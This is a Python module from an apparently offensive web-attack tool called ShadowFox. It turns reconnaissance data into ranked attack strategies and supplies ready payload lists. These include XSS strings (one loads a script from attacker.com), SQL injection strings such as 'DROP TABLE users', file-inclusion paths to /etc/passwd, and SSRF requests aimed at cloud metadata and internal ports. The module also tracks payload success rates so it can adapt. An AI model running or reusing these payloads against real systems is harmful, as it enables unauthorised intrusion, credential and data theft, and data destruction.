# shadowfox/engines/xse_engine.py

import json
import logging
from typing import Dict, List, Any, Tuple
from datetime import datetime
import re
from dataclasses import dataclass
from enum import Enum

class VulnType(Enum):
    XSS = "XSS"
    SQLI = "SQLi"
    LFI = "LFI"
    SSRF = "SSRF"
    CSRF = "CSRF"
    COMMAND_INJECTION = "Command Injection"
    XXE = "XXE"
    IDOR = "IDOR"
    AUTH_BYPASS = "Auth Bypass"

class ConfidenceLevel(Enum):
    VERY_HIGH = 0.9
    HIGH = 0.75
    MEDIUM = 0.5
    LOW = 0.25
    VERY_LOW = 0.1

@dataclass
class StrategyDecision:
    """Struktura za strategijsku odluku XSE-a"""
    vuln_type: VulnType
    payload_selection: List[str]
    reasoning: str
    confidence: float
    priority: int
    expected_indicators: List[str]
    fallback_strategy: str

class ShadowFoxXSE:
    """
    Explainable Strategy Engine - Mozak ShadowFox-a
    
    Odgovoran za:
    - Analizu recon podataka i donošenje strategijskih odluka
    - Objašnjavanje zašto je odabrao određene payload-e
    - Adaptivno učenje na osnovu prethodnih rezultata
    - Prioritizaciju napada na osnovu verovatnoće uspeha
    """
    
    def __init__(self, operator):
        self.operator = operator
        self.logger = logging.getLogger('ShadowFoxXSE')
        
        # Knowledge base - pattern matching pravila
        self.vulnerability_patterns = self._init_vulnerability_patterns()
        self.technology_risks = self._init_technology_risks()
        self.payload_effectiveness = self._init_payload_effectiveness()
        
        # Adaptivno učenje - čuva statistike uspešnosti
        self.learning_stats = {
            "payload_success_rates": {},
            "technology_vuln_correlation": {},
            "timing_patterns": {}
        }
        
    def _init_vulnerability_patterns(self) -> Dict:
        """Inicijalizuje pattern matching za identifikaciju ranjivosti"""
        return {
            VulnType.XSS: {
                "indicators": [
                    "input fields without validation",
                    "missing content-security-policy",
                    "user input reflection",
                    "javascript frameworks detected",
                    "search functionality present"
                ],
                "high_risk_params": ["q", "search", "query", "keyword", "name", "comment", "message"],
                "context_clues": ["search forms", "comment sections", "profile updates"],
                "payload_preference": ["reflected", "stored", "dom_based"]
            },
            
            VulnType.SQLI: {
                "indicators": [
                    "database error messages",
                    "login forms present",
                    "search with numeric parameters",
                    "url parameters with numeric values",
                    "php/asp.net technology stack"
                ],
                "high_risk_params": ["id", "user_id", "product_id", "category", "page"],
                "context_clues": ["authentication forms", "e-commerce", "cms platforms"],
                "payload_preference": ["union_based", "boolean_based", "time_based"]
            },
            
            VulnType.LFI: {
                "indicators": [
                    "file include parameters",
                    "php technology detected",
                    "file upload functionality",
                    "path traversal opportunities"
                ],
                "high_risk_params": ["file", "path", "page", "include", "template", "view"],
                "context_clues": ["file managers", "template systems", "include mechanisms"],
                "payload_preference": ["path_traversal", "wrapper_based", "log_poisoning"]
            },
            
            VulnType.SSRF: {
                "indicators": [
                    "url parameters for external resources",
                    "webhook functionality",
                    "image/file fetching from urls",
                    "api proxy endpoints"
                ],
                "high_risk_params": ["url", "webhook", "callback", "fetch", "proxy", "redirect"],
                "context_clues": ["image upload from url", "webhook integrations", "proxy services"],
                "payload_preference": ["internal_network", "cloud_metadata", "dns_based"]
            }
        }
    
    def _init_technology_risks(self) -> Dict:
        """Mapira tehnologije na česte ranjivosti"""
        return {
            "WordPress": {
                "common_vulns": [VulnType.XSS, VulnType.SQLI, VulnType.LFI],
                "risk_level": 0.8,
                "specific_targets": ["wp-admin", "wp-content/plugins", "xmlrpc.php"]
            },
            "PHP": {
                "common_vulns": [VulnType.LFI, VulnType.SQLI, VulnType.XSS],
                "risk_level": 0.7,
                "specific_targets": ["index.php", "config.php", "admin.php"]
            },
            "ASP.NET": {
                "common_vulns": [VulnType.XSS, VulnType.SQLI, VulnType.IDOR],
                "risk_level": 0.6,
                "specific_targets": [".aspx pages", "viewstate", "session management"]
            },
            "Django": {
                "common_vulns": [VulnType.XSS, VulnType.CSRF, VulnType.IDOR],
                "risk_level": 0.4,
                "specific_targets": ["admin panel", "forms", "api endpoints"]
            }
        }
    
    def _init_payload_effectiveness(self) -> Dict:
        """Bazna efikasnost payload-a po tipovima"""
        return {
            VulnType.XSS: {
                "reflected": 0.7,
                "stored": 0.9,
                "dom_based": 0.6
            },
            VulnType.SQLI: {
                "union_based": 0.8,
                "boolean_based": 0.6,
                "time_based": 0.7,
                "error_based": 0.9
            },
            VulnType.LFI: {
                "path_traversal": 0.8,
                "wrapper_based": 0.6,
                "log_poisoning": 0.4
            }
        }
    
    def analyze_and_strategize(self, recon_data: Dict, mission_id: str) -> List[StrategyDecision]:
        """
        Glavna funkcija - analizira recon podatke i kreira strategiju napada
        """
        self.logger.info(f"XSE počinje strategijsku analizu za misiju {mission_id}")
        
        strategies = []
        
        # 1. Analiza tehnologija i mapiranje na ranjivosti
        tech_risks = self._analyze_technology_risks(recon_data.get("technologies", {}))
        
        # 2. Analiza formi i parametara
        form_strategies = self._analyze_forms_for_vulns(recon_data.get("forms", []))
        
        # 3. Analiza endpoints-a
        endpoint_strategies = self._analyze_endpoints_for_vulns(recon_data.get("endpoints", []))
        
        # 4. Analiza sigurnosnih zaglavlja
        header_strategies = self._analyze_security_headers(recon_data.get("headers", {}))
        
        # 5. Kombinuj sve strategije
        all_strategies = tech_risks + form_strategies + endpoint_strategies + header_strategies
        
        # 6. Prioritizuj i objasni
        prioritized_strategies = self._prioritize_strategies(all_strategies, recon_data)
        
        # 7. Loguj strategiju
        self.operator.log_agent_action("XSE", "strategy_created", {
            "total_strategies": len(prioritized_strategies),
            "high_priority": len([s for s in prioritized_strategies if s.priority >= 8]),
            "vulnerability_types": [s.vuln_type.value for s in prioritized_strategies]
        })
        
        return prioritized_strategies
    
    def _analyze_technology_risks(self, technologies: Dict) -> List[StrategyDecision]:
        """Analizira tehnologije i predlaže strategije"""
        strategies = []
        
        for tech_name, detected in technologies.items():
            if not detected or tech_name not in self.technology_risks:
                continue
                
            tech_info = self.technology_risks[tech_name]
            
            for vuln_type in tech_info["common_vulns"]:
                confidence = tech_info["risk_level"] * 0.8  # Malo smanji confidence
                
                reasoning = f"""
                🎯 Tehnologija: {tech_name}
                📊 Rizik: {tech_info['risk_level']:.1%}
                🔍 Razlog: {tech_name} često ima {vuln_type.value} ranjivosti
                🎲 Verovatnoća: {confidence:.1%} na osnovu istorijskih podataka
                """
                
                strategy = StrategyDecision(
                    vuln_type=vuln_type,
                    payload_selection=self._get_recommended_payloads(vuln_type, tech_name),
                    reasoning=reasoning.strip(),
                    confidence=confidence,
                    priority=int(confidence * 10),
                    expected_indicators=self._get_expected_indicators(vuln_type),
                    fallback_strategy=f"Ako {vuln_type.value} ne uspe, probaj srodne tehnike"
                )
                
                strategies.append(strategy)
        
        return strategies
    
    def _analyze_forms_for_vulns(self, forms: List[Dict]) -> List[StrategyDecision]:
        """Analizira HTML forme za potencijalne ranjivosti"""
        strategies = []
        
        for form in forms:
            method = form.get("method", "GET")
            inputs = form.get("inputs", [])
            action = form.get("action", "")
            
            # Analiza za XSS
            text_inputs = [inp for inp in inputs if inp.get("type") in ["text", "search", "email"]]
            if text_inputs:
                confidence = 0.7 if method == "POST" else 0.5
                
                reasoning = f"""
                🎯 Meta: HTML forma sa {len(text_inputs)} text input poljima
                📝 Method: {method}
                🔍 Razlog: Text input polja često su ranjiva na XSS napade
                💡 Strategija: Testiraj reflected i stored XSS payload-e
                """
                
                strategies.append(StrategyDecision(
                    vuln_type=VulnType.XSS,
                    payload_selection=self._get_xss_payloads_for_form(text_inputs),
                    reasoning=reasoning.strip(),
                    confidence=confidence,
                    priority=7,
                    expected_indicators=["script execution", "alert boxes", "html injection"],
                    fallback_strategy="Ako osnovni XSS ne radi, probaj encoding bypass tehnike"
                ))
            
            # Analiza za SQL Injection
            if any(inp.get("name", "").lower() in ["id", "user_id", "login", "username"] for inp in inputs):
                confidence = 0.8
                
                reasoning = f"""
                🎯 Meta: Forma sa potencijalno ranjivim parametrima
                🔍 Parametri: {[inp.get('name') for inp in inputs if inp.get('name')]}
                💉 Razlog: Parametri kao 'id', 'user_id' često direktno idu u SQL upite
                """
                
                strategies.append(StrategyDecision(
                    vuln_type=VulnType.SQLI,
                    payload_selection=self._get_sqli_payloads_for_form(inputs),
                    reasoning=reasoning.strip(),
                    confidence=confidence,
                    priority=8,
                    expected_indicators=["database errors", "mysql syntax", "sql warnings"],
                    fallback_strategy="Počni sa error-based, zatim boolean-based SQL injection"
                ))
        
        return strategies
    
    def _analyze_endpoints_for_vulns(self, endpoints: List[str]) -> List[StrategyDecision]:
        """Analizira endpoints za ranjivosti"""
        strategies = []
        
        for endpoint in endpoints:
            # LFI mogućnosti
            if any(param in endpoint.lower() for param in ["file", "path", "page", "include"]):
                reasoning = f"""
                🎯 Endpoint: {endpoint}
                🔍 Razlog: URL sadrži parametar koji može uključivati fajlove
                💡 Strategija: Path traversal i LFI payload-i
                """
                
                strategies.append(StrategyDecision(
                    vuln_type=VulnType.LFI,
                    payload_selection=self._get_lfi_payloads(),
                    reasoning=reasoning.strip(),
                    confidence=0.6,
                    priority=6,
                    expected_indicators=["file contents", "etc/passwd", "boot.ini"],
                    fallback_strategy="Probaj različite encoding tehnike za path traversal"
                ))
            
            # SSRF mogućnosti
            if any(param in endpoint.lower() for param in ["url", "callback", "webhook", "fetch"]):
                reasoning = f"""
                🎯 Endpoint: {endpoint}
                🔍 Razlog: Parametar koji prima URL vrednosti - potencijal za SSRF
                💡 Strategija: Internal network scanning i cloud metadata
                """
                
                strategies.append(StrategyDecision(
                    vuln_type=VulnType.SSRF,
                    payload_selection=self._get_ssrf_payloads(),
                    reasoning=reasoning.strip(),
                    confidence=0.7,
                    priority=7,
                    expected_indicators=["internal responses", "metadata access", "port scan results"],
                    fallback_strategy="Probaj bypass tehnike za SSRF filtering"
                ))
        
        return strategies
    
    def _analyze_security_headers(self, headers: Dict) -> List[StrategyDecision]:
        """Analizira nedostajuća sigurnosna zaglavlja"""
        strategies = []
        missing_headers = headers.get("missing_security", [])
        
        if "x-frame-options" in missing_headers:
            reasoning = """
            🎯 Ranjivost: Clickjacking
            🔍 Razlog: Nedostaje X-Frame-Options zaglavlje
            💡 Strategija: Test iframe embedding i clickjacking payload-i
            """
            
            strategies.append(StrategyDecision(
                vuln_type=VulnType.XSS,  # Clickjacking kao subset XSS-a
                payload_selection=["<iframe src='target_url'>", "frameset payload-i"],
                reasoning=reasoning.strip(),
                confidence=0.9,
                priority=5,
                expected_indicators=["successful iframe embedding"],
                fallback_strategy="UI redressing tehnike"
            ))
        
        if "content-security-policy" in missing_headers:
            reasoning = """
            🎯 Ranjivost: XSS - Nedostaje CSP
            🔍 Razlog: Content Security Policy nije definisan
            💡 Strategija: Agresivniji XSS payload-i bez CSP ograničenja
            """
            
            strategies.append(StrategyDecision(
                vuln_type=VulnType.XSS,
                payload_selection=self._get_xss_payloads_no_csp(),
                reasoning=reasoning.strip(),
                confidence=0.8,
                priority=8,
                expected_indicators=["script execution", "external resource loading"],
                fallback_strategy="Inline script i event handler injection"
            ))
        
        return strategies
    
    def _prioritize_strategies(self, strategies: List[StrategyDecision], recon_data: Dict) -> List[StrategyDecision]:
        """Prioritizuje strategije na osnovu konteksta i verovatnoće uspeha"""
        
        # Dodeli bonus bodove na osnovu konteksta
        for strategy in strategies:
            # Bonus za forme (veća interaktivnost)
            if recon_data.get("forms") and strategy.vuln_type in [VulnType.XSS, VulnType.SQLI]:
                strategy.priority += 2
                strategy.confidence = min(0.95, strategy.confidence + 0.1)
            
            # Bonus za poznate tehnologije
            technologies = recon_data.get("technologies", {})
            if any(tech in self.technology_risks for tech in technologies.keys()):
                strategy.priority += 1
            
            # Malus za niske confidence vrednosti
            if strategy.confidence < 0.3:
                strategy.priority = max(1, strategy.priority - 2)
        
        # Sortiraj po prioritetu i confidence
        return sorted(strategies, key=lambda x: (x.priority, x.confidence), reverse=True)
    
    def _get_recommended_payloads(self, vuln_type: VulnType, context: str = "") -> List[str]:
        """Vraća preporučene payload-e za dati tip ranjivosti"""
        payload_map = {
            VulnType.XSS: [
                "<script>alert('XSS')</script>",
                "'\"><script>alert(document.domain)</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>"
            ],
            VulnType.SQLI: [
                "' OR '1'='1",
                "' UNION SELECT NULL,NULL,NULL--",
                "'; DROP TABLE users; --",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
            ],
            VulnType.LFI: [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "php://filter/read=convert.base64-encode/resource=index.php",
                "/proc/self/environ"
            ],
            VulnType.SSRF: [
                "http://127.0.0.1:80",
                "http://169.254.169.254/metadata",
                "file:///etc/passwd",
                "gopher://127.0.0.1:25"
            ]
        }
        
        return payload_map.get(vuln_type, [])
    
    def _get_expected_indicators(self, vuln_type: VulnType) -> List[str]:
        """Vraća očekivane indikatore uspešnog napada"""
        indicators = {
            VulnType.XSS: ["alert box", "script execution", "DOM manipulation"],
            VulnType.SQLI: ["database error", "union select", "information disclosure"],
            VulnType.LFI: ["file contents", "directory listing", "source code"],
            VulnType.SSRF: ["internal response", "port scan", "metadata access"]
        }
        
        return indicators.get(vuln_type, [])
    
    def _get_xss_payloads_for_form(self, inputs: List[Dict]) -> List[str]:
        """Specifični XSS payload-i za forme"""
        return [
            "<script>alert('XSS_FORM')</script>",
            "'\"><svg/onload=alert('XSS')>",
            "javascript:alert(document.cookie)",
            "<img src=x onerror=alert('FORM_XSS')>"
        ]
    
    def _get_sqli_payloads_for_form(self, inputs: List[Dict]) -> List[str]:
        """Specifični SQL injection payload-i za forme"""
        return [
            "admin' --",
            "' OR 1=1 --",
            "' UNION SELECT user(),version(),database() --",
            "' AND (SELECT * FROM (SELECT COUNT(*),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a --"
        ]
    
    def _get_lfi_payloads(self) -> List[str]:
        """LFI payload-i"""
        return [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "php://filter/read=convert.base64-encode/resource=../config.php",
            "/proc/self/environ",
            "../../../windows/system32/drivers/etc/hosts"
        ]
    
    def _get_ssrf_payloads(self) -> List[str]:
        """SSRF payload-i"""
        return [
            "http://127.0.0.1",
            "http://localhost:22",
            "http://169.254.169.254/metadata/v1/",
            "file:///etc/passwd",
            "http://[::1]:80"
        ]
    
    def _get_xss_payloads_no_csp(self) -> List[str]:
        """Agresivniji XSS payload-i kada nema CSP"""
        return [
            "<script src='http://attacker.com/xss.js'></script>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<object data='javascript:alert(\"XSS\")'></object>",
            "<embed src='javascript:alert(\"XSS\")'></embed>"
        ]
    
    def explain_strategy_decision(self, decision: StrategyDecision) -> str:
        """
        Detaljno objašnjenje strategijske odluke za izveštaj
        """
        explanation = f"""
🧠 **XSE STRATEGIJSKA ANALIZA**

**Tip ranjivosti:** {decision.vuln_type.value}
**Prioritet:** {decision.priority}/10
**Confidence:** {decision.confidence:.1%}

**Objašnjenje strategije:**
{decision.reasoning}

**Odabrani payload-i:**
{chr(10).join(f"• {payload}" for payload in decision.payload_selection)}

**Očekivani indikatori uspeha:**
{chr(10).join(f"• {indicator}" for indicator in decision.expected_indicators)}

**Fallback strategija:**
{decision.fallback_strategy}

**XSE preporuka:** 
Počni sa payload-ima najvišeg prioriteta i prati očekivane indikatore.
Ako ne vidiš očekivane rezultate u prva 3 pokušaja, aktiviraj fallback strategiju.
        """
        
        return explanation.strip()
    
    def update_learning_stats(self, vuln_type: VulnType, payload: str, success: bool):
        """
        Ažurira statistike učenja na osnovu rezultata
        """
        key = f"{vuln_type.value}:{payload[:50]}"  # Ograniči dužinu ključa
        
        if key not in self.learning_stats["payload_success_rates"]:
            self.learning_stats["payload_success_rates"][key] = {"attempts": 0, "successes": 0}
        
        self.learning_stats["payload_success_rates"][key]["attempts"] += 1
        if success:
            self.learning_stats["payload_success_rates"][key]["successes"] += 1
        
        # Loguj učenje
        success_rate = (self.learning_stats["payload_success_rates"][key]["successes"] / 
                       self.learning_stats["payload_success_rates"][key]["attempts"])
        
        self.logger.info(f"XSE Learning Update: {vuln_type.value} payload success rate: {success_rate:.2%}")

# Test XSE funkcionalnosti
if __name__ == "__main__":
    # Mock recon data za testiranje
    mock_recon = {
        "technologies": {"WordPress": True, "PHP": True},
        "forms": [
            {
                "action": "/search",
                "method": "GET", 
                "inputs": [{"name": "q", "type": "text"}]
            },
            {
                "action": "/login",
                "method": "POST",
                "inputs": [{"name": "username", "type": "text"}, {"name": "password", "type": "password"}]
            }
        ],
        "endpoints": ["/admin", "/api?file=config.php"],
        "headers": {
            "missing_security": ["x-frame-options", "content-security-policy"]
        }
    }
    
    from operator import ShadowFoxOperator
    
    op = ShadowFoxOperator()
    xse = ShadowFoxXSE(op)
    
    strategies = xse.analyze_and_strategize(mock_recon, "test-mission")
    
    print(f"\n🧠 XSE ANALIZA - Pronađeno {len(strategies)} strategija:\n")
    
    for i, strategy in enumerate(strategies[:3], 1):  # Prikaži top 3
        print(f"{'='*60}")
        print(f"STRATEGIJA #{i}")
        print(xse.explain_strategy_decision(strategy))
        print()
